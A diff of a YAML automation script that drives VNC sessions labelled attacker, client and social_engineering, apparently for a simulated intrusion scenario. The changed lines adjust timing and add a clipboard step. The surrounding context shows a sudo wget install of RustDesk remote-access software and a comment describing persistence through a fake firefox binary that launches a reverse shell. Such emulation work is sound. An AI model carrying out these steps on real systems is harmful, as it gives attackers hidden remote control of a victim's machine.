@@ -110,6 +110,23 @@ commands:
   - type: sleep
     seconds: 3
 
+  # copy something to the clipboard
+  - type: vnc 
+    cmd: type 
+    input: echo 'Dummy Text' | xclip -selection clipboard
+    session: social_engineering
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: client
+
+  - type: sleep
+    seconds: 3
+
   - type: vnc 
     cmd: type 
     input: "sudo wget -O rustdesk.deb -e use_proxy=yes -e https_proxy=https://192.168.50.254:3128 https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.deb"
@@ -639,7 +656,7 @@ commands:
     session: attacker
 
   - type: sleep
-    seconds: 1
+    seconds: 5
 
 #### Persistence OPTION A set up a fake firefox binary that executes the reverse shell and then the actual firefox
 
@@ -657,6 +674,9 @@ commands:
     cmd: key
     key: "enter"
     session: attacker
+
+  - type: sleep
+    seconds: 1
 
   # make it executable
   - type: vnc
